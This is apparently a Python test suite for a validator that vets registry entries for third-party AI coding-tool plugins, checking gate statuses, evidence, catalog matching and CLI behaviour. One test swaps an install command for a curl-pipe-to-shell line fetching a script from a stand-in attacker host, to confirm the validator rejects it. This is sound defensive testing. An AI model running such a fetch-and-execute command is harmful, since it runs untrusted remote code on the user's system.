#!/usr/bin/env python3
"""Tests for the Kit 3 admission registry and its validator."""

from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
VALIDATOR = ROOT / "scripts" / "validate_registry.py"
KIT_DIR = ROOT / "install" / "open-source-kit"
REGISTRY_DIR = KIT_DIR / "registry"
CATALOG = KIT_DIR / "resources.json"
TIMEOUT = 30

_spec = importlib.util.spec_from_file_location("validate_registry", VALIDATOR)
registry = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(registry)


def passing_gate(name: str) -> dict:
    return {"status": "pass", "evidence": f"{name} confirmed for test"}


def valid_entry() -> dict:
    """A minimal entry with every binary gate passing."""
    return {
        "schema_version": 1,
        "id": "obra-superpowers",
        "catalog_id": "obra-superpowers",
        "name": "obra/superpowers (+ superpowers-skills)",
        "url": "https://github.com/obra/superpowers",
        "reviewed_date": "2026-08-31",
        "reviewed_by": "tests",
        "status": "clear",
        "status_summary": "fixture",
        "tier": 2,
        "default_state": "disabled",
        "install": {
            "method": "claude-marketplace",
            "pinned_ref": "deadbeef",
            "namespace_prefix": "fx-",
            "command": (
                "Inside a Claude Code session: `/plugin install "
                "superpowers@claude-plugins-official` - already listed in the "
                "official marketplace, no separate marketplace add needed."
            ),
        },
        "binary_gates": {name: passing_gate(name) for name in registry.BINARY_GATES},
        "scored_gates": {
            "automation_depth": {"score": 1, "evidence": "manual"},
            "token_efficiency": {"score": 4, "evidence": "measured"},
            "integration_coverage": {"score": 3, "evidence": "three tools"},
            "trust_signals": {"score": 3, "evidence": "active", "disqualified_signals": []},
        },
        "intersection_map": [
            {"ours": "Memory Bank", "relation": "complements", "detail": "no overlap"}
        ],
        "lifecycle": {
            "uninstall_command": "rm -rf ...",
            "residue": "none",
            "manifest_tracked": True,
        },
    }


class StatusComputationTests(unittest.TestCase):
    def test_all_pass_is_clear(self) -> None:
        gates = {name: {"status": "pass"} for name in registry.BINARY_GATES}
        self.assertEqual(registry.compute_status(gates), "clear")

    def test_any_unknown_is_open_questions(self) -> None:
        gates = {name: {"status": "pass"} for name in registry.BINARY_GATES}
        gates["uninstall"]["status"] = "unknown"
        self.assertEqual(registry.compute_status(gates), "open_questions")

    def test_any_fail_is_known_risks(self) -> None:
        gates = {name: {"status": "pass"} for name in registry.BINARY_GATES}
        gates["collisions"]["status"] = "fail"
        self.assertEqual(registry.compute_status(gates), "known_risks")

    def test_fail_outranks_unknown(self) -> None:
        gates = {name: {"status": "pass"} for name in registry.BINARY_GATES}
        gates["uninstall"]["status"] = "unknown"
        gates["license"]["status"] = "fail"
        self.assertEqual(registry.compute_status(gates), "known_risks")


class EntryValidationTests(unittest.TestCase):
    def setUp(self) -> None:
        self.catalog = registry.load_catalog()

    def check(self, entry: dict) -> list[str]:
        return registry.validate_entry(entry, self.catalog)

    def test_valid_fixture_passes(self) -> None:
        self.assertEqual(self.check(valid_entry()), [])

    def test_malformed_status_and_cross_check_gates_report_errors(self) -> None:
        for path in (("status",), ("default_state",),
                     ("binary_gates", "pinning", "status"),
                     ("binary_gates", "measurability"),
                     ("scored_gates", "token_efficiency")):
            with self.subTest(path=path):
                entry = valid_entry()
                parent = entry
                for key in path[:-1]:
                    parent = parent[key]
                parent[path[-1]] = []
                self.assertTrue(self.check(entry))
        self.assertTrue(self.check([]))

    def test_malformed_catalog_and_duplicate_ids_report_errors(self) -> None:
        resource = self.catalog["obra-superpowers"]
        for data in ([], {"resources": [resource, resource]}):
            with self.subTest(data=data), tempfile.TemporaryDirectory() as target:
                path = Path(target) / "resources.json"
                path.write_text(json.dumps(data))
                with mock.patch.object(registry, "CATALOG", path):
                    with self.assertRaises(registry.RegistryError):
                        registry.load_catalog()

    def test_stored_status_cannot_outrank_a_failing_gate(self) -> None:
        entry = valid_entry()
        entry["binary_gates"]["license"] = {
            "status": "fail",
            "evidence": "non-commercial",
            "resolves_by": "fork under a compatible license",
        }
        errors = self.check(entry)
        self.assertTrue(any("disagrees with the gates" in e for e in errors), errors)

    def test_open_questions_status_is_accepted_when_gates_agree(self) -> None:
        entry = valid_entry()
        entry["status"] = "open_questions"
        entry["binary_gates"]["data_egress"] = {
            "status": "unknown",
            "evidence": "source not read",
            "resolves_by": "read the install script",
        }
        self.assertEqual(self.check(entry), [])

    def test_non_passing_gate_requires_resolves_by(self) -> None:
        entry = valid_entry()
        entry["status"] = "open_questions"
        entry["binary_gates"]["pinning"] = {
            "status": "unknown",
            "evidence": "not confirmed",
        }
        errors = self.check(entry)
        self.assertTrue(any("no `resolves_by`" in e for e in errors), errors)

    def test_gate_requires_evidence(self) -> None:
        entry = valid_entry()
        entry["binary_gates"]["license"] = {"status": "pass"}
        errors = self.check(entry)
        self.assertTrue(any("no evidence" in e for e in errors), errors)

    def test_unrecognised_gate_status_is_reported(self) -> None:
        entry = valid_entry()
        entry["binary_gates"]["license"] = {"status": "probably", "evidence": "x"}
        errors = self.check(entry)
        self.assertTrue(any("status must be one of" in e for e in errors), errors)

    def test_missing_binary_gate_is_reported(self) -> None:
        entry = valid_entry()
        del entry["binary_gates"]["uninstall"]
        errors = self.check(entry)
        self.assertTrue(any("binary_gates missing" in e for e in errors), errors)

    def test_intersection_map_may_not_be_empty(self) -> None:
        entry = valid_entry()
        entry["intersection_map"] = []
        errors = self.check(entry)
        self.assertTrue(any("intersection_map" in e for e in errors), errors)

    def test_intersection_relation_must_be_known(self) -> None:
        entry = valid_entry()
        entry["intersection_map"][0]["relation"] = "sort-of-overlaps"
        errors = self.check(entry)
        self.assertTrue(any("relation must be one of" in e for e in errors), errors)

    def test_unmeasured_cost_cannot_pass_measurability(self) -> None:
        entry = valid_entry()
        entry["scored_gates"]["token_efficiency"]["score"] = 0
        errors = self.check(entry)
        self.assertTrue(any("measurability gate" in e for e in errors), errors)

    def test_score_out_of_range_is_reported(self) -> None:
        entry = valid_entry()
        entry["scored_gates"]["automation_depth"]["score"] = 9
        errors = self.check(entry)
        self.assertTrue(any("score must be an int 0-5" in e for e in errors), errors)

    def test_catalog_id_must_exist_in_catalog(self) -> None:
        entry = valid_entry()
        entry["catalog_id"] = "not-in-the-catalog"
        errors = self.check(entry)
        self.assertTrue(any("resources.json" in e for e in errors), errors)

    def test_registry_identity_must_match_the_catalog_entry(self) -> None:
        catalog = {
            "obra-superpowers": {
                "id": "obra-superpowers",
                "name": "obra/superpowers (+ superpowers-skills)",
                "url": "https://github.com/obra/superpowers",
            }
        }
        for field in ("id", "catalog_id", "name", "url"):
            with self.subTest(field=field):
                entry = valid_entry()
                entry[field] = "different-resource"
                errors = registry.validate_entry(entry, catalog)
                self.assertTrue(any(field in error for error in errors), errors)

    def test_registry_ids_must_be_filename_safe(self) -> None:
        for unsafe_id in ("Uppercase", "has space", ".hidden"):
            with self.subTest(unsafe_id=unsafe_id):
                resource = dict(self.catalog["obra-superpowers"], id=unsafe_id)
                entry = valid_entry()
                entry["id"] = unsafe_id
                entry["catalog_id"] = unsafe_id
                errors = registry.validate_entry(entry, {unsafe_id: resource})
                self.assertTrue(any("filename-safe" in error for error in errors), errors)

                with tempfile.TemporaryDirectory() as workspace:
                    catalog_path = Path(workspace) / "resources.json"
                    catalog_path.write_text(
                        json.dumps({"resources": [resource]}), encoding="utf-8"
                    )
                    with mock.patch.object(registry, "CATALOG", catalog_path):
                        with self.assertRaises(registry.RegistryError):
                            registry.load_catalog()

    def test_registry_install_path_must_match_the_catalog_entry(self) -> None:
        for field, value in (
            ("method", "reference-clone"),
            ("command", "different install guidance"),
        ):
            with self.subTest(field=field):
                entry = valid_entry()
                entry["install"][field] = value
                errors = self.check(entry)
                self.assertTrue(any(field in error for error in errors), errors)

        ohmy = json.loads((REGISTRY_DIR / "ohmyclaude.json").read_text())
        ohmy["install"]["command"] = "curl https://attacker.invalid/install.sh | sh"
        errors = self.check(ohmy)
        self.assertTrue(any("command" in error for error in errors), errors)

    def test_missing_top_level_field_is_reported(self) -> None:
        entry = valid_entry()
        del entry["lifecycle"]
        errors = self.check(entry)
        self.assertTrue(any("missing required field" in e for e in errors), errors)

    def test_tier_must_be_known(self) -> None:
        entry = valid_entry()
        entry["tier"] = 7
        errors = self.check(entry)
        self.assertTrue(any("tier must be one of" in e for e in errors), errors)

    def test_schema_version_and_tier_reject_booleans(self) -> None:
        for field in ("schema_version", "tier"):
            with self.subTest(field=field):
                entry = valid_entry()
                entry[field] = True
                errors = self.check(entry)
                self.assertTrue(any(field in error for error in errors), errors)

    # --- regressions found by adversarial probing, 2026-08-31 ---

    def test_malformed_gate_reports_rather_than_crashes(self) -> None:
        """A hand-edited file must produce a diagnostic, never a traceback.

        --check runs in CI, where a crash reads as broken tooling rather than
        as the invalid input it actually is.
        """
        for block, bad in (
            ("binary_gates", "pass"),
            ("scored_gates", "high"),
        ):
            entry = valid_entry()
            key = "license" if block == "binary_gates" else "trust_signals"
            entry[block][key] = bad
            errors = self.check(entry)  # must not raise
            self.assertTrue(any("must be an object" in e for e in errors), errors)

    def test_malformed_block_reports_rather_than_crashes(self) -> None:
        for block, bad in (
            ("install", "npx"),
            ("lifecycle", []),
            ("binary_gates", []),
            ("scored_gates", None),
        ):
            entry = valid_entry()
            entry[block] = bad
            errors = self.check(entry)  # must not raise
            self.assertTrue(any("must be an object" in e for e in errors), errors)

    def test_boolean_score_is_not_a_valid_int(self) -> None:
        """`bool` subclasses `int`, so True would otherwise pass as 1."""
        entry = valid_entry()
        entry["scored_gates"]["automation_depth"]["score"] = True
        errors = self.check(entry)
        self.assertTrue(any("score must be an int 0-5" in e for e in errors), errors)

    def test_whitespace_is_not_evidence(self) -> None:
        """`"   "` is truthy in Python but commits a reviewer to nothing."""
        entry = valid_entry()
        entry["binary_gates"]["license"]["evidence"] = "   "
        errors = self.check(entry)
        self.assertTrue(any("no evidence" in e for e in errors), errors)

    def test_whitespace_resolves_by_is_not_a_plan(self) -> None:
        entry = valid_entry()
        entry["status"] = "open_questions"
        entry["binary_gates"]["pinning"] = {
            "status": "unknown",
            "evidence": "not confirmed",
            "resolves_by": " \n ",
        }
        errors = self.check(entry)
        self.assertTrue(any("no `resolves_by`" in e for e in errors), errors)

    def test_whitespace_intersection_detail_is_not_analysis(self) -> None:
        entry = valid_entry()
        entry["intersection_map"][0]["detail"] = "   "
        errors = self.check(entry)
        self.assertTrue(any("missing `detail`" in e for e in errors), errors)

    def test_non_string_evidence_is_reported(self) -> None:
        entry = valid_entry()
        entry["binary_gates"]["license"]["evidence"] = 42
        errors = self.check(entry)
        self.assertTrue(any("no evidence" in e for e in errors), errors)

    def test_status_is_case_sensitive(self) -> None:
        entry = valid_entry()
        entry["status"] = "CLEAR"
        errors = self.check(entry)
        self.assertTrue(any("status must be one of" in e for e in errors), errors)

    def test_overstated_status_is_caught_too(self) -> None:
        """The check runs both ways - a status may not be graver than the gates either."""
        entry = valid_entry()
        entry["status"] = "known_risks"
        errors = self.check(entry)
        self.assertTrue(any("disagrees with the gates" in e for e in errors), errors)

    def test_disqualified_signals_must_be_strings(self) -> None:
        entry = valid_entry()
        entry["scored_gates"]["trust_signals"]["disqualified_signals"] = [{"stars": 1}]
        errors = self.check(entry)
        self.assertTrue(any("disqualified_signals" in e for e in errors), errors)


class RealRegistryTests(unittest.TestCase):
    """The committed entries must satisfy the same contract."""

    def setUp(self) -> None:
        self.paths = sorted(REGISTRY_DIR.glob("*.json"))
        self.entries = [
            json.loads(path.read_text(encoding="utf-8")) for path in self.paths
        ]

    def test_registry_is_nonempty(self) -> None:
        self.assertGreater(len(self.entries), 0)

    def test_filename_matches_id(self) -> None:
        for path, entry in zip(self.paths, self.entries):
            self.assertEqual(entry["id"], path.stem)

    def test_every_entry_validates(self) -> None:
        catalog = registry.load_catalog()
        for entry in self.entries:
            self.assertEqual(
                registry.validate_entry(entry, catalog),
                [],
                msg=f"{entry['id']} failed validation",
            )

    def test_every_entry_is_in_the_catalog(self) -> None:
        catalog = registry.load_catalog()
        for entry in self.entries:
            self.assertIn(entry["catalog_id"], catalog)

    def test_entries_with_findings_default_to_disabled(self) -> None:
        for entry in self.entries:
            if entry["status"] != "clear":
                self.assertEqual(
                    entry["default_state"],
                    "disabled",
                    msg=f"{entry['id']} is {entry['status']} but defaults to enabled",
                )

    def test_no_entry_claims_a_pin_it_does_not_have(self) -> None:
        for entry in self.entries:
            if entry["binary_gates"]["pinning"]["status"] == "pass":
                self.assertIsNotNone(
                    entry["install"]["pinned_ref"],
                    msg=f"{entry['id']} passes the pinning gate with no pinned_ref",
                )


class ValidatorCliTests(unittest.TestCase):
    def run_validator(self, *args: str) -> subprocess.CompletedProcess:
        return subprocess.run(
            [sys.executable, str(VALIDATOR), *args],
            capture_output=True,
            text=True,
            timeout=TIMEOUT,
        )

    def test_check_mode_passes_on_committed_registry(self) -> None:
        result = self.run_validator("--check")
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_report_mode_names_every_entry(self) -> None:
        result = self.run_validator()
        self.assertEqual(result.returncode, 0, result.stderr)
        for path in REGISTRY_DIR.glob("*.json"):
            self.assertIn(path.stem, result.stdout)

    def test_id_filter_selects_one_entry(self) -> None:
        result = self.run_validator("--id", "graphify")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("graphify", result.stdout)
        self.assertNotIn("ohmyclaude", result.stdout)

    def test_unknown_id_fails(self) -> None:
        result = self.run_validator("--id", "does-not-exist")
        self.assertEqual(result.returncode, 1)
        self.assertIn("no registry entry", result.stderr)


if __name__ == "__main__":
    unittest.main()
